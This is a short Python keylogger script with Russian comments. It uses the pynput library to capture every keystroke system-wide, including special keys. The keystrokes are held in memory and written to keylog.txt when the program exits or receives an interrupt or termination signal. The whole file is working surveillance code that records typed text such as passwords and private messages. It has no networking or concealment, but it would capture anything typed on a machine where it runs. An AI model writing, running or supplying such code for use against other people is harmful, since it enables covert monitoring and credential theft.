import pynput
from pynput.keyboard import Key, Listener
import atexit
import signal
import sys

# Глобальная переменная для хранения лога в памяти
log = ""

# Функция для обработки нажатия клавиши
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        # Обработка специальных клавиш
        if key == Key.space:
            log += ' '
        elif key == Key.enter:
            log += '\n'
        elif key == Key.tab:
            log += '\t'
        else:
            log += f'[{key.name}]'

# Функция для сохранения лога в файл
def save_log():
    with open('keylog.txt', 'w') as log_file:
        log_file.write(log)
    print("Лог сохранен в keylog.txt")

# Регистрация функции сохранения при нормальном завершении
atexit.register(save_log)

# Обработка сигналов для graceful shutdown (работает на Unix-like системах)
def signal_handler(sig, frame):
    save_log()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Для Ctrl+C
signal.signal(signal.SIGTERM, signal_handler)  # Для системного завершения

# Запуск слушателя клавиатуры
with Listener(on_press=on_press) as listener:
    listener.join()
